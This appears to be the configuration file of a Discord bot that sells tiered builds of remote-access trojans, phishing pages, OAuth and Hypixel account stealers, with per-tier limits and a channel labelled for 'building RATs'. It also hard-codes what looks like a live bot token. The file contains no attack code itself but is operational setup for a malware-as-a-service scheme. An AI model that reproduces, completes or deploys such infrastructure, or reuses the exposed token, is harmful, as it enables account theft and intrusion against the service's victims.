export const token = "MTE3MDQ1MzA5ODM4NTM5MTYyNg.GBUWEs.UYaI750SuHQaP5OwtYUC1hp7yTFiTtOeTgkjqk";
export const clientID = "1170453098385391626";
export const devs = ["548936534448144404", "548936534448144404"];
export const logs = "1170445128977096760"; // Channel ID used for logging.
export const building = "1170445129602044029"; // Channel ID used for building RATs.
export const commands = "1170445129602044029"; // Channel ID used for commands.
export const banWaveDetector = "1170445129774014464"; // Channel ID used for ban wave detector.
export const tiers = ["1170445128951926928","1170445128951926929","1170445128951926930","1170445128951926931"];
export const colors = {
  commands: {
    build: {
      free: "DarkNavy",
      basic: "#00FF00", // Green
      premium: "#0000FF", // Blue
      oauth_free: "Red",
      oauth_premium: "#FF00FF", // Pink
      phisher: "#9900FF"
    },
    decrypt: "#FF0000", // Red
    inject: "#FFFF00", // Yellow
    pump: "#FF8000", // Orange
  },
  logs: {
    build: {
      free: "DarkNavy",
      basic: "#00FF00", // Green
      premium: "#0000FF", // Blue
      oauth_free: "Red",
      oauth_premium: "#FF00FF", // Pink
      hypixel: "#9900FF",
      phisher: "#9900FF"
    },
    decrypt: "#FF0000", // Red
    inject: "#FFFF00", // Yellow
    pump: "#FF8000", // Orange
  },
};
export const limits = {
  phisher: {
    tier_0: 1,
    tier_1: 2,
    tier_2: 3,
    tier_3: 4,
  },
  webhooks: {
    tier_0: 1,
    tier_1: 2,
    tier_2: 3,
    tier_3: 4,
  },
  oauth: {
    tier_0: 1,
    tier_1: 2,
    tier_2: 3,
    tier_3: 4,
  },
};
